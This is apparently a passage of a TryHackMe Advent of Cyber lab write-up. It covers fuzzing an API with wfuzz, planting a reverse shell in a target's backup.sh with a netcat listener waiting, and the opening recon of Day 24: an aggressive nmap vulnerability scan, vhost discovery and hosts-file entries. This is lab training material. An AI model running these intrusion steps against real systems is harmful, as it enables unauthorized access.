> wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ

- Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?

Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

1. Start a netcat listener

2. Download backup.sh, add a [reverse shell from this GH repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

## *[Day 24] Special by DarkStar The Trial Before Christmas*

- Scan the machine. What ports are open?

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.246.199 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

We got 2 webservers:

[x] 80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

[x] 65000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

> 80, 65000

Ok, let's take a look to enumeration results:

- port 80:

```
| http-vhosts: 
| 125 names had status 200
| ssl
|_server
```

- port 65000:

```
| http-vhosts: 
| 125 names had status 200
| smtp
|_apps
```

Add these lines to your ***hosts*** file:

```
10.10.246.199   ssl
10.10.246.199   server
10.10.246.199   smtp
10.10.246.199   apps
```

Also, create ***ports.txt*** file with following contents:

```
80
65000
```

and ***hosts.txt***:

```
ssl
server
smtp
apps
```

- What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
